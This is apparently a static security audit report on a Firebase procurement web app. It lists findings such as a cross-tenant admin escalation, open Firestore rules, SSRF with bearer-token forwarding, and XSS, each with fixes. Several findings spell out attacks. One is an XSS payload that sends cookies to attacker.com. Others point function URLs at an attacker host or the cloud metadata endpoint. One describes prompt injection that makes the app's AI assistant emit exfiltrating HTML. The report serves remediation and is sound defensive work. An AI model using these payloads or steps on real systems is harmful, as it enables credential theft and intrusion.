# MatrixARC Security Audit — 2026-04-24

Reviewed: `firestore.rules`, `storage.rules`, `firebase.json`, `deploy.sh`, `functions/**`, `public/index.html` (~30k lines), `public/sw.js`, `public/firebase-messaging-sw.js`, `public/modules/**`, `npm audit`, git history for committed secrets.

The app version on disk is `v1.19.732`. The audit is purely static — no runtime, IAM, or GCP-console checks.

## Executive Summary

- **2 CRITICAL, 5 HIGH, 7 MEDIUM, 5 LOW** findings.
- **Top 3 things to fix today:**
  1. **Close the company-membership privilege escalation** (Finding C-1). Any signed-in Firebase user can write themselves into any company as `admin` by crafting a `?join=` URL or by writing directly to Firestore. This is a complete cross-tenant compromise of every company's data.
  2. **Lock down `rfqUploads` / `reviewUploads` / `supplierUploads`** (Finding C-2). Firestore rules currently allow any unauthenticated reader to dump every RFQ ever sent (including line items, vendor emails, BC project numbers, supplier-uploaded PDFs). `update: if true` on `rfqUploads` lets anyone overwrite any submission.
  3. **Fix the SSRF in `bulkMfrList` / `bulkMfrLookup`** (Finding H-3) — these Cloud Functions take an attacker-controlled URL (`bcODataBase`) and forward an attached bearer token to it. Any signed-in user can use them to (a) leak the BC token to an attacker-controlled host or (b) hit GCP metadata / internal services.

**Overall posture:** the app has good intent — Firestore rules are mostly tenant-scoped, callable functions check `context.auth`, secrets are kept out of git, and the engineering portal escapes HTML correctly. But several flows trade safety for convenience: there's a client-only invite-acceptance bypass that defeats the whole tenant model, the supplier portal token model lets anyone read submissions, the RFQ HTML email builder concatenates untrusted strings into HTML, and a couple of Cloud Functions are essentially open SSRF/credential-forwarding gateways. None of these were exploited by the unrelated ransomware incident, but the cross-tenant escalation is severe enough that it should be patched before the next deploy.

## Findings

### [CRITICAL] C-1 — Company membership self-write bypass (any user → admin of any company)
**File:** `public/index.html:30736-30769`, plus `firestore.rules:103-110`
**Surface:** Firestore rules + client invite flow
**Description:** The client URL-invite path reads a `?join=<base64>` payload, parses it as `{c:companyId, r:role, e:email}`, and writes directly to `companies/{companyId}/members/{uid}` with the role from the URL:
```js
const{c:companyId,r:role}=joinPayload;
const batch=fbDb.batch();
batch.set(fbDb.doc(`companies/${companyId}/members/${u.uid}`),{email:u.email,role,addedAt:Date.now()});
```
The Firestore rule for that path is:
```
match /members/{memberId} {
  allow create: if request.auth != null && memberId == request.auth.uid;
}
```
There is **no check that an invite actually exists, no role validation, no company allow-list**. The `acceptTeamInvite` Cloud Function (which does verify the invite token and email) is bypassed entirely — the client just writes the doc.
**Impact:** Any user with a Firebase Auth account at this project can:
- Discover/guess any `companyId` (they are short / sequentially-derived from BC company name in places),
- Open the Firestore console / use `fbDb.doc(...).set(...)` from devtools,
- Write themselves as `{role:'admin'}` into that company's `members` collection,
- Immediately gain read/write to **every project**, BC config (including the company API key for Anthropic), supplier portals, Codale credentials in localStorage, etc.
This is a full cross-tenant breach.
**Fix:**
- Tighten the Firestore rule on `members/{memberId}.create` to require a matching `pendingInvites/{token}` doc:
  ```
  allow create: if request.auth != null && memberId == request.auth.uid &&
    exists(/databases/$(database)/documents/companies/$(companyId)/pendingInvites/$(request.resource.data.inviteToken)) &&
    get(/databases/$(database)/documents/companies/$(companyId)/pendingInvites/$(request.resource.data.inviteToken)).data.email == request.auth.token.email;
  ```
- Or remove the client-write path entirely and route all invite acceptance through the existing `acceptTeamInvite` Cloud Function.
- Audit `companies/{companyId}/members` collection across all companies right now and remove any member that doesn't have a corresponding accepted invite or BC project history. (You can list `members` server-side, then cross-check against `pendingInvites` / project ownership.)

---

### [CRITICAL] C-2 — Public read on `rfqUploads` and `reviewUploads`
**File:** `firestore.rules:50-63`
**Surface:** Firestore rules
**Description:**
```
match /rfqUploads/{token} {
  allow read: if true;
  allow create: if request.auth != null;
  allow update: if true;
  allow delete: if request.auth != null;
}
match /reviewUploads/{token} {
  allow read: if true;
  allow create: if request.auth != null;
  allow update: if true;
  allow delete: if request.auth != null;
}
```
`allow read: if true` on a top-level collection means anyone (including unauthenticated attackers) can read **any document if they know its ID**. The tokens are random, but there is no defense-in-depth: there is no check that the requester possesses the token via the link, no rate-limit, no expiry enforcement at the rule layer.

`allow update: if true` is worse — anyone who guesses or obtains a token can overwrite the document. They can change `status`, `lineItems`, `confirmedCrossings`, `storageUrl`, etc. — including marking a quote as `submitted` (which fires `onSupplierQuoteSubmitted`, sending fake quote emails to the ARC user, attempting to attach an attacker-controlled `storageUrl` PDF — see Finding H-2).

There is no rule-level expiry check. Both the supplier portal and engineering portal check `expiresAt` client-side (line 89, line 30365) but the Firestore rule does not. An expired token is still readable + writable from the rules perspective.
**Impact:**
- Anyone with any token (intercepted email, forwarded link, leaked log line) can read full RFQ contents (vendor name, vendor email, project number, BC project info, line items with prices, customer info).
- Anyone with a token can vandalize submissions (delete all line items, change `vendorEmail` so confirmation emails go to attacker, set `status:'submitted'` to trigger Cloud Function events).
- Token enumeration: the function-generated tokens are 32-hex (high entropy), but the client-generated tokens at `index.html:9554` (`Date.now().toString(36)+Math.random().toString(36).slice(2,6)`) are weak and predictable.
**Fix:**
- Move all token-gated reads/writes through Cloud Functions (HTTPS callable or `onRequest`) with the token validated server-side. Delete the public Firestore rules.
- If you must keep direct Firestore access from the portal, at minimum:
  - Add `allow read: if request.time < resource.data.expiresAt` and require `expiresAt` to exist.
  - Restrict `update` to a server-side function or to specific allow-listed field changes (e.g. only `submittedAt`, `status:'submitted'`, `lineItems`, `confirmedCrossings`, `storageUrl`, `fileName`) and only when the doc is currently `status:'pending'`. Use Firestore rule `request.resource.data.diff(resource.data).affectedKeys().hasOnly([...])`.
  - Generate all tokens with `crypto.randomBytes(16)` in a Cloud Function — never `Math.random()`.

---

### [HIGH] H-1 — HTML injection in RFQ email builder (`buildRfqEmailHtml`)
**File:** `public/index.html:3740-3819`
**Surface:** Client / outbound email
**Description:** The function interpolates many fields directly into raw HTML with no escaping:
```js
return `<!DOCTYPE html><html><body...>
  ...${item.partNumber||"—"}...${item.description||"—"}...${item.manufacturer||"—"}...
  ${group.vendorName}...${projectName||"—"}...${rfqNum}...${responseBy}...
  ${co.logoUrl ? `<img src="${co.logoUrl}" ...>` : `<h2>${co.name||"..."}</h2>`}
  ${co.address}...${co.phone}...
  <a href="${uploadUrl}"...>`;
```
- `item.partNumber`, `item.description`, `item.manufacturer` come from BOM extraction (AI-controlled) or from supplier-edited fields (attacker-controlled via the open `rfqUploads` rule above).
- `group.vendorName`, `projectName`, `co.name`, `co.address`, `co.phone`, `co.logoUrl` come from BC company info — generally trusted, but BC company info is editable by anyone connected to BC.
- `uploadUrl` is built by the app, but `rfqNum` and `responseBy` are user-controlled in the modal.

A `description` containing `</td><script>...</script>` or a `co.logoUrl` like `x" onerror="..."` becomes live HTML in the rendered email. The same builder is also rendered into an `<iframe srcDoc=...>` for preview at line 10243 — modern browsers do honor scripts inside an `iframe srcdoc`, so this is XSS in the ARC user's own session, scoped to that iframe (not same-origin to parent because srcdoc inherits the embedder's origin in most browsers — confirm before assuming it's harmless).
**Impact:**
- Phishing/spoofing of the supplier email (insert spoofed "Pay invoice here" links).
- Hidden HTML in vendor emails that breaks recipient mail clients or smuggles redirects.
- Possible XSS in the in-app preview iframe.
**Fix:** Add an HTML-escape helper and apply it to every interpolated field:
```js
const esc = s => String(s ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
```
For `co.logoUrl` and `uploadUrl`, validate they begin with `https://` and use `encodeURI` for the href value. Reject `javascript:` and `data:` URLs.

---

### [HIGH] H-2 — Email-attachment SSRF + arbitrary blob exfil via `onSupplierQuoteSubmitted`
**File:** `functions/index.js:355-378`
**Surface:** Cloud Function (Firestore trigger)
**Description:** When a supplier marks a submission `status: 'submitted'`, the trigger fetches `after.storageUrl` over HTTPS and attaches the response as a base64 PDF to an email sent to the ARC user:
```js
if (after.storageUrl) {
  const pdfBuffer = await new Promise((resolve, reject) => {
    https.get(after.storageUrl, (res) => { ... resolve(Buffer.concat(chunks)); ... });
  });
  emailMsg.attachments = [{ content: pdfBuffer.toString('base64'), filename: pdfFileName, type: 'application/pdf', disposition: 'attachment' }];
}
```
Combined with C-2 (any caller can `update` `rfqUploads/{token}` and set `status:'submitted'` and `storageUrl` to anything), an attacker can:
- Set `storageUrl: 'http://169.254.169.254/computeMetadata/v1/...'` and attempt to read GCP metadata. (`https.get` with `http://` URL will probably fail because the function uses `https.get`, but if the URL is `https://attacker.com/big.pdf` the function will fetch up to the SendGrid attachment limit, possibly pulling DDoS attention to the function and burning quota.)
- Force the function to send the ARC user an attached PDF whose content is arbitrary attacker-controlled HTML/JS/EXE renamed `.pdf`.
- Pivot for credential exfil: with a different content-type, the response could be rendered if the user opens it in a previewer.
**Impact:** Server-driven SSRF (limited because of `https.get`-only), arbitrary attachment delivery to the ARC user from a function emailing on the company's domain.
**Fix:**
- Refuse `storageUrl` values that are not under your `firebasestorage.googleapis.com` bucket. Validate with `new URL(after.storageUrl).hostname === 'firebasestorage.googleapis.com'` (or the pattern matching your bucket).
- Cap fetch size (track bytes received and abort if > N MB).
- Set `family: 4`, `lookup: blockPrivateIp` to prevent SSRF to `169.254.x` / RFC1918 addresses, or use a library like `ssrf-req-filter`.
- Or: store the supplier-uploaded PDF via your existing `supplierUploads/{token}` Storage path and reference it by storage object name (not URL); fetch via the Admin SDK `bucket.file(...).download()`.

---

### [HIGH] H-3 — SSRF + credential forwarding in `bulkMfrList` / `bulkMfrLookup`
**File:** `functions/index.js:1552-1666`
**Surface:** Cloud Function (HTTPS callable)
**Description:** Both functions accept the `bcODataBase` URL and `bcToken` from the client and use them in `fetch()`:
```js
const url = `${bcODataBase}/ItemCard?$filter=Manufacturer_Code eq ''...`;
const r = await fetch(url, { headers: { 'Authorization': `Bearer ${bcToken}` } });
// ...PATCH...
const patchUrl = `${bcODataBase}/ItemCard('${encodeURIComponent(pn)}')`;
await fetch(patchUrl, { method: 'PATCH', headers: { ...bcHeaders, 'If-Match': '*' }, body: ... });
```
There is no allow-list for `bcODataBase`. Any authenticated caller can:
- Set `bcODataBase: 'https://attacker.com'` and the function happily forwards their BC bearer token in the `Authorization` header. The attacker captures the BC token and uses it to read/write the ARC user's BC tenant for the lifetime of the token.
- Set `bcODataBase: 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default'` to attempt to hit GCP metadata (would fail if `Authorization: Bearer ...` confuses the metadata server, but the attempt is still concerning).
- Set `bcODataBase` to internal-network URLs to probe the function's egress reachability.

The `pn` value is `encodeURIComponent`-wrapped (good) but the body of the PATCH writes attacker-influenced `code` strings to BC.
**Impact:** Bearer-token theft (BC tenant), SSRF to internal/cloud metadata, BC data tampering.
**Fix:**
- Drop `bcODataBase` and `bcToken` from the input. Look them up from Firestore based on `context.auth.uid` (`users/{uid}/config/bc`) — the same pattern `runCodaleScrape` uses.
- Validate the resolved `bcODataBase` with an allow-list (`api.businesscentral.dynamics.com`).
- Same applies to `customScraperLookup` / `customScraperBatch` (`steps[].url`): an attacker controls every URL Puppeteer navigates to. Restrict to `https://` only and to a per-scraper allow-listed host (the scraper config already includes `baseUrl`).

---

### [HIGH] H-4 — `dangerouslySetInnerHTML` on AI assistant output and inbound Outlook email body
**File:** `public/index.html:20388` and `public/index.html:29761-29773`
**Surface:** Client (XSS)
**Description:** Two places inject HTML without sanitization:
1. `previewEmail.bodyHtml` — direct inject of inbound Outlook email body. A malicious external email could include `<script>` or `<img onerror=...>` and run in the ARC origin (`matrix-arc.web.app`), with access to Firebase Auth tokens, BC token, all Firestore data.
2. The AI chat assistant runs a regex-based markdown-to-HTML pass:
```js
let html = msg.content
  .replace(/\*\*(.+?)\*\*/g, '<strong...>$1</strong>')
  ...
```
The original `msg.content` is never escaped first. An AI prompt injection that gets the model to emit raw HTML (e.g. embed `<img src=x onerror="fetch('https://attacker.com/?d='+document.cookie)"/>`) executes in the ARC origin. Because the assistant pulls in user-provided project context and BC data, prompt injection through a malicious BOM description is realistic.
**Impact:** Same-origin XSS → exfiltrate Firebase ID token, BC bearer token, Anthropic API key (`_apiKey`), all Firestore data the user can access.
**Fix:**
- Email preview: render the email in a sandboxed iframe (`<iframe sandbox="allow-popups">` with no `allow-scripts` and no `allow-same-origin`). Many sites use DOMPurify before insertion — using both belt-and-suspenders is fine.
- AI assistant: escape `msg.content` first, *then* run the markdown-style replacements on the escaped string (so `<` in the input becomes `&lt;` before regex runs). Or use a real markdown library configured to disallow raw HTML.

---

### [HIGH] H-5 — `users/{uid}/notifications` create allows arbitrary cross-user spam
**File:** `firestore.rules:17-20`
**Surface:** Firestore rules
**Description:**
```
match /users/{uid}/notifications/{notifId} {
  allow create: if request.auth != null;
  allow read, update, delete: if request.auth != null && request.auth.uid == uid;
}
```
Any authenticated user can create a notification document inside any other user's notifications subcollection — including arbitrary `title`, `body`, `url`, `projectId`, `rfqUploadId`. The bell icon dropdown renders these and clicking can navigate to `url` (line 30453 area) and auto-open modals with attacker-controlled IDs.
**Impact:** Phishing inside the app, social-engineering admins to click attacker-controlled links, possibly drive them into the spoofed `PortalSubmissionsModal` flow.
**Fix:** Require the creator to be either the same user or a member of the same company (and validate `type` against an allow-list, validate `url` matches `APP_URL`, etc.). Better yet, write notifications only from Cloud Functions and forbid client-side create.

---

### [MEDIUM] M-1 — Weak invite tokens generated client-side
**File:** `public/index.html:9554`
**Surface:** Client
**Description:**
```js
const token=Date.now().toString(36)+Math.random().toString(36).slice(2,8);
```
This produces ~31 bits of entropy (the `Math.random()` part), prepended with a public timestamp. If an attacker observes that an invite was sent to a known email in the last few minutes, brute-forcing 6 base-36 chars is feasible (≈ 2 billion guesses, probably out of reach via Firestore single-doc reads but not via a token-stuffing attack). Token also has no `expiresAt`, so it lives forever.
**Impact:** Weak invite tokens combined with the rule `pendingInvites.read: if isMember()` means another company member can read every invite — but C-1 already lets anyone bypass invites entirely. Once C-1 is fixed, this becomes the next weakest link.
**Fix:** Mint invite tokens server-side via `crypto.randomBytes(16)` (already done in `inviteTeamMember` — make the client always go through it instead of writing to Firestore directly). Add `expiresAt: Date.now()+7*24*60*60*1000` and enforce in rules.

---

### [MEDIUM] M-2 — `users/{uid}/{document=**}` recursion exposes mistakes
**File:** `firestore.rules:12-14`
**Surface:** Firestore rules
**Description:**
```
match /users/{uid}/{document=**} {
  allow read, write: if request.auth != null && request.auth.uid == uid;
}
```
This is a sound default, but it means *every* future subcollection under `users/{uid}/...` is readable + writable by that user, including paths intended to be admin-only. The doc `users/{uid}/config/api` (Anthropic API key) is currently read by the user's own browser, fine. But this rule also lets the user delete their own `fcmTokens`, write arbitrary data into any path, and read any future data the app stores there. Combined with the (separate) rule `acceptTeamInvite` copying the company API key into `users/{uid}/config/api` (line 218), the user has a copy of the company API key in plaintext, persistent in their tab forever.
**Impact:** Defense-in-depth gap. If the company key is rotated by the admin, ex-members still have a stale copy. Compromise of one user account yields the company-wide Anthropic key.
**Fix:**
- Replace the `=**` glob with explicit subcollection rules, or at minimum add an `allow write: if !('locked' in resource.data)` style guard for sensitive fields.
- Don't copy the Anthropic key into per-user storage. Have the client read directly from `companies/{companyId}/config/api` (already permitted by the `config` rule for members) so that key rotation is immediate.
- When a member is removed (`removeTeamMember`), explicitly delete `users/{uid}/config/api` and `users/{uid}/config/bc` from the function.

---

### [MEDIUM] M-3 — Storage `pageImages/{uid}` is read+write by ANY authenticated user
**File:** `storage.rules:5-8`
**Surface:** Storage rules
**Description:**
```
match /pageImages/{uid}/{allPaths=**} {
  allow read, write: if request.auth != null;
}
```
The decision note says "Team members need to upload updated drawings to each other's projects." But the rule has no team-membership check — *every* authenticated user (including users who just signed up for any other tenant) can list/download/overwrite/delete any uid's drawing PDFs and page images.
**Impact:** Cross-tenant read/write of every customer's drawings (which contain customer names, BOM contents, panel layouts).
**Fix:** Add a member check like the `companies/{companyId}` rule:
```
match /pageImages/{uid}/{allPaths=**} {
  allow read, write: if request.auth != null &&
    (request.auth.uid == uid ||
     firestore.exists(/databases/(default)/documents/users/$(request.auth.uid)/config/profile) &&
     firestore.get(/databases/(default)/documents/users/$(request.auth.uid)/config/profile).data.companyId ==
     firestore.get(/databases/(default)/documents/users/$(uid)/config/profile).data.companyId);
}
```
Or migrate page images to `companies/{companyId}/pageImages/...` so the existing company rule applies.

---

### [MEDIUM] M-4 — `supplierUploads` storage write is unauthenticated AND unbounded count
**File:** `storage.rules:9-14`
**Surface:** Storage rules
**Description:**
```
match /supplierUploads/{token}/{allPaths=**} {
  allow read: if true;
  allow write: if request.resource.size < 25 * 1024 * 1024;
}
```
Anyone (no auth required) can upload up to 25MB to any `supplierUploads/{anything}/anything.pdf` path, and anyone can read it. There's no token-validity check. An attacker can:
- Spam the bucket with arbitrary content (cost amplification).
- Host arbitrary files publicly under your domain (`firebasestorage.googleapis.com/.../matrix-arc.../supplierUploads/...`) for phishing.
- Plant a file at a known token path to influence the AI extraction in the supplier portal.
**Fix:**
- Require `request.auth != null` even for the supplier portal. Suppliers don't sign in, but you can mint short-lived custom tokens via a Cloud Function when the supplier opens the portal link, then use those for the upload.
- Or restrict by file extension (`.pdf` only) and add a Firestore-rules-style cross-check (Storage rules can call `firestore.get(...)`):
  ```
  allow write: if request.resource.size < 25 * 1024 * 1024 &&
    firestore.exists(/databases/(default)/documents/rfqUploads/$(token)) &&
    firestore.get(/databases/(default)/documents/rfqUploads/$(token)).data.expiresAt > request.time.toMillis();
  ```

---

### [MEDIUM] M-5 — Functions Node modules: 1 critical / 4 high vulnerabilities
**File:** `functions/package.json`, `functions/package-lock.json`
**Surface:** Dependency
**Description:** `npm audit` in `functions/` reports **17 vulnerabilities (1 critical, 4 high, 10 moderate, 2 low)**. Notable:
- `protobufjs <7.5.5` — **CRITICAL** arbitrary code execution (transitive via firebase-admin / google-gax).
- `basic-ftp <=5.2.1` — **HIGH** CRLF injection / arbitrary FTP commands (transitive via `@sparticuz/chromium` puppeteer toolchain).
- `path-to-regexp` ReDoS — **HIGH**.
- `axios` SSRF + cloud-metadata header injection — **MODERATE** but related to existing SSRF posture (H-3).
- `uuid <14.0.0` — **MODERATE** missing buffer bounds.

`firebase-functions` is pinned to `^4.0.0`; the current major is v6 and v5 introduced security improvements.
**Impact:** Most are transitive and not directly exploitable from your code paths, but they represent latent risk if the underlying primitives get used in new code.
**Fix:** `cd functions && npm audit fix`. Audit the breaking-change update to `firebase-admin` v10 (current major is much higher; v10 is *older* than your current — re-check the suggested fix, you probably want to bump to the latest v12 or v13 which fixes most). Bump `firebase-functions` to v6.

---

### [MEDIUM] M-6 — `_system/{docId}` is writable by every authenticated user
**File:** `firestore.rules:6-9`
**Surface:** Firestore rules
**Description:**
```
match /_system/{docId} {
  allow read: if request.auth != null;
  allow write: if request.auth != null;
}
```
Comment says "admins write on deploy" but the rule does not enforce admin. Any authenticated user can write/overwrite `_system/version`, `_system/anything`. If this drives client behavior (e.g. forced upgrade prompts, kill-switch flags), an attacker can disrupt all clients.
**Fix:** Restrict write to a hard-coded admin uid list, or write `_system` from Cloud Functions only and remove client write.

---

### [MEDIUM] M-7 — Console logs expose PII, internal IDs, and partial AI output
**File:** Many. Notable: `public/index.html:361`, `public/index.html:29277`, `functions/index.js:680, 706, 759, 816-820, 1334-1356, 1430, 1356, 1378`
**Surface:** Logging
**Description:** Production console logs include:
- `'Push notifications enabled, token saved'` — fine.
- BC API responses in browser devtools (visible to any browser extension running in the page).
- Cloud Function logs include user emails (`reporterEmail`, `userEmail`), part numbers, prices, lookup decisions, full account-switch text, full `verifyText.includes(accountId)`, and more — these end up in Cloud Logging which is admin-readable but worth tightening.
- `extractSupplierQuotePricing` was recently fixed to log only response *length* (`functions/index.js:680`) — good — but parse failures still log `text.slice(0, 120)` which can include partial extracted prices/part numbers.
**Impact:** Browser extensions and any user with Cloud Logging viewer role can see content they shouldn't. Not a direct vulnerability but a privacy / compliance concern.
**Fix:** Add a `DEBUG` flag and gate verbose logs behind it. In Cloud Functions, prefer `functions.logger.info` (already used in places) and avoid logging request/response bodies.

---

### [LOW] L-1 — Missing security headers (CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, HSTS)
**File:** `firebase.json:18-50`
**Surface:** Hosting config
**Description:** The hosting config sets only `Cache-Control` headers. Firebase Hosting auto-adds HSTS for `web.app`, but there is no Content-Security-Policy, no `X-Frame-Options: DENY` (so the app can be iframed, enabling clickjacking on the auth flow), no `Referrer-Policy: no-referrer`, no `Permissions-Policy` to disable unused APIs.
**Impact:** Defense-in-depth gap. CSP would have made H-4 (XSS via inbound email / AI output) far harder to weaponize.
**Fix:** Add to `firebase.json` headers for `**/*.html`:
```json
{ "key": "Content-Security-Policy", "value": "default-src 'self'; script-src 'self' 'unsafe-inline' https://www.gstatic.com https://cdnjs.cloudflare.com https://alcdn.msauth.net https://api.anthropic.com; connect-src 'self' https://*.googleapis.com https://*.firebaseio.com https://api.anthropic.com https://graph.microsoft.com https://*.dynamics.com; img-src 'self' data: blob: https:; style-src 'self' 'unsafe-inline'; frame-ancestors 'none'" },
{ "key": "X-Frame-Options", "value": "DENY" },
{ "key": "X-Content-Type-Options", "value": "nosniff" },
{ "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" },
{ "key": "Permissions-Policy", "value": "camera=(), microphone=(), geolocation=()" }
```
Note: the app uses inline scripts heavily, so `'unsafe-inline'` is required unless you nonce-tag everything. Even a permissive CSP eliminates 90% of XSS payloads (e.g. `<img onerror=fetch(attacker)>` becomes blocked once `connect-src` is restricted).

---

### [LOW] L-2 — `postMessage` to `'*'` includes BC bearer token
**File:** `public/index.html:27388`, `public/index.html:27450`
**Surface:** Client
**Description:** When module iframes request context, the parent page calls `iframeRef.current?.contentWindow?.postMessage({...ctx, bcToken:_bcToken,...}, '*')`. The wildcard target is OK *only* because the iframe `src` is same-origin (`/purchasing/`). But if the iframe ever gets navigated to a third-party URL (or the iframe content is replaced via XSS in shared.js), the token leaks.
**Fix:** Replace `'*'` with `iframeRef.current.contentWindow.location.origin`, or simpler, the literal `'https://matrix-arc.web.app'` (and `http://localhost:5000` for local dev).

---

### [LOW] L-3 — `bcPriceUpdates` audit log readable by any authenticated user
**File:** `firestore.rules:39-46`
**Surface:** Firestore rules
**Description:**
```
match /bcPriceUpdates/{updateId} {
  allow read: if request.auth != null;
  ...
}
```
Any signed-in user (including someone in a different company) can read price-update audit entries. Unlikely to expose secrets but reveals what part numbers a competitor is updating prices on.
**Fix:** Add a company-membership check or move to `companies/{companyId}/bcPriceUpdates`.

---

### [LOW] L-4 — Engineering portal renders thumbnail `img src` without URL validation
**File:** `public/modules/engineering/portal.js:197-201`
**Surface:** Client
**Description:**
```js
thumbContainer.innerHTML = _drawingPages.map((url, i) => `
  ...<img src="${url}" .../>
`).join('');
```
`_drawingPages` comes from `info.drawingPages` (Firestore `reviewUploads/{token}.drawingPages`). Per C-2 anyone can write to that doc. An attacker can set `drawingPages: ['" onerror="alert(1)" x="']` to break out of the attribute. Most other strings in this file use `escapeHtml` — these don't.
**Fix:** Apply `escapeHtml` to URLs interpolated into HTML (or move to `document.createElement('img'); img.src = url`).

---

### [LOW] L-5 — Service workers claim all clients on activate
**File:** `public/sw.js:9-12`, `public/firebase-messaging-sw.js:9-12`
**Surface:** Client
**Description:** `self.clients.claim()` fired immediately on activation, combined with `skipWaiting()` on install, can briefly hand control to a new SW version that was registered while the page was open. Combined with Firebase's no-cache header, real risk is low — but if a future SW version were ever compromised (via a CDN swap), it would take effect immediately for all users.
**Fix:** Acceptable as-is given the SW only does push notifications; no cache layer exists to be poisoned. If you ever add caching, add a kill-switch that unregisters the SW when fetched config says to.

---

## Need more info / can't be assessed statically

- **GCP IAM**: who/what has Owner/Editor on `matrix-arc`. Cloud Function service account scopes — recommended to confirm the default Compute SA isn't used. Not visible from code.
- **Firebase env config**: `firebase functions:config:get` would show if any old `functions.config().X` secrets remain (we only see `process.env.X` from `.env`). Nothing in code references `functions.config()`.
- **MSAL App Registration permissions** (BC token / Graph token): are they delegated only? Are they publishing IDs that allow the wrong audience?
- **SendGrid sender authentication**: SPF/DKIM/DMARC for `matrixpci.com` weren't checked. If not enforced, the spoofing risk in H-1 is amplified.
- **Whether `sendInviteEmail` is rate-limited**: a malicious admin could spam-email arbitrary addresses (low risk).
- **Currently-active members across all companies**: would need a one-off audit to confirm no exploitation of C-1 has already happened. (Cross-check `companies/*/members` against `pendingInvites` history and BC user lists.)
- **Firestore production data**: `companies/*/config/api` may contain Anthropic API keys — need to verify what's stored in plain vs encrypted at rest. Firestore at-rest is encrypted, but per Anthropic's TOS those keys should be rotated regularly anyway.
- **Whether the published Firebase project's Auth config allows email/password OR only SSO** — this affects how easily a remote attacker can create the Firebase Auth account needed to exploit C-1.

## Positive observations

- `.env` is in `.gitignore` and has never been committed (verified via `git log --all`).
- Hard-coded secrets in client code: only the Firebase API key (which is intended to be public). No SendGrid, Anthropic, BC, Codale, DigiKey, Mouser, OEMSecrets keys in any HTML/JS file.
- `firestore.rules` uses `.get(key, default)` correctly to avoid CEL "missing field" exceptions on optional flags (good — `firestore.rules:91-95`).
- Owner-priority lock pattern is well-designed: rule checks both owner identity and an explicit `ownerLockActive` flag with timestamp, plus an audit log (`ownerTakeovers`).
- `acceptTeamInvite` Cloud Function does check `request.auth.token.email` against the invite email (line 197) — so if you can route all invite acceptance through it (Finding C-1), you're solid.
- Engineering portal escapes HTML correctly (`escapeHtml` used throughout `portal.js`).
- `extractSupplierQuotePricing` recently scrubbed verbose logging (`functions/index.js:676-680`) — good security hygiene.
- BC token is held in JS memory only (not localStorage) — limits exposure to XSS.
- All HTTPS callable functions check `context.auth` before doing work (verified across `inviteTeamMember`, `acceptTeamInvite`, `removeTeamMember`, `updateMemberRole`, `sendInviteEmail`, `sendEngineerQuestionEmail`, `extractSupplierQuotePricing`, `codaleRunScrape`, `codaleTestScrape`, `customScraperLookup`, `customScraperBatch`, `mouserSearch`, `digikeySearch`, `searchVendorPricing`, `bulkMfrList`, `bulkMfrLookup`, `createPurchaseOrder`, `updatePurchaseOrderStatus`, `sendReviewEmail`, `testTeamsWebhook`, `diagnoseMemberApiKey`).
- Token generation in `inviteTeamMember` uses `crypto.getRandomValues(new Uint8Array(16))` (32-hex chars, sufficient).
- `purchasing.createPurchaseOrder` does proper company-membership check + role gating (no IDOR via passed-in `companyId`).
- The decision-doc style (`DECISION(v1.19.xxx):`) in rules + functions makes future audits much easier — preserve it.
